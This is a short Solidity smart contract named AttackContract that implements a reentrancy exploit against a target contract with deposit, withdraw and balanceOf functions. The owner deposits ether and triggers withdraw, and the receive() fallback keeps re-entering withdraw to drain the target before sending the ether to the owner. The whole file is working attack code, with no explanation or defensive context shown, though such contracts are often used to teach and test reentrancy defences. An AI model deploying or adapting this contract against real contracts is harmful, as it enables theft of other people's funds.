// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract AttackContract is Ownable {
    IVulnerableContract public immutable targetContract;

    constructor(address targetContractAddress) Ownable(msg.sender) {
        targetContract = IVulnerableContract(targetContractAddress);
    }

    function attack() external payable onlyOwner {
        targetContract.deposit{value: msg.value}();
        targetContract.withdraw();
    }

    receive() external payable {
        if (
            address(targetContract).balance >=
            targetContract.balanceOf(address(this))
        ) {
            targetContract.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
